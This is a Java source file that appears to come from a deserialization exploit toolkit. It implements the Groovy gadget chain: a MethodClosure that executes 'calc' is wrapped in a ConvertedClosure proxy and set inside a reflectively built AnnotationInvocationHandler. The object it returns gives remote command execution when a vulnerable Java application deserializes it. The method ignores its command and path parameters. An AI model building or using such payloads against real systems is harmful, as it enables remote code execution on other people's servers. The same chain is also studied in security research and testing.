package org.gadget;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.gadget.inter.Gadget;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

public class Groovy implements Gadget {

    @Override
    public Object getObject(String command,String path) throws Exception {
        //封装我们需要执行的对象
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        ConvertedClosure closure = new ConvertedClosure(methodClosure, "entrySet");

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // 创建 ConvertedClosure 的动态代理类实例
        Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
                new Class[]{Map.class}, closure);

//        handler.entrySet();

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);
        return invocationHandler;
    }
}
